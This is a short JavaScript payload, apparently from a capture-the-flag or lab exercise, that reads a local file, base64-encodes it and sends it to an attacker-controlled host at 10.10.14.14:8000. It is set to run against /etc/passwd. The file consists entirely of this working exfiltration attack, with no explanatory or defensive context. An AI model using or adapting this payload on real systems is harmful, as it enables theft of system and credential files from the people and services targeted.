async function sendFileContent(filePath) {
  // Load the file content
  var fileContent = await loadFile(filePath);

  // Encode the file content as base64
  var base64Content = btoa(fileContent);

  // Send the base64-encoded content to the server
  var response = await fetch(`http://10.10.14.14:8000/${base64Content}`);

  // Check the response status
  if (response.ok) {
    console.log("File content sent successfully");
  } else {
    console.error("Failed to send file content");
  }
}

async function loadFile(filePath) {
  return new Promise(function (resolve, reject) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", filePath, true);
    xhr.responseType = "text";
    xhr.onload = function () {
      if (xhr.readyState === xhr.DONE) {
        if (xhr.status === 200) {
          resolve(xhr.response);
        } else {
          reject(xhr.statusText);
        }
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText);
    };
    xhr.send();
  });
}

sendFileContent("/etc/passwd");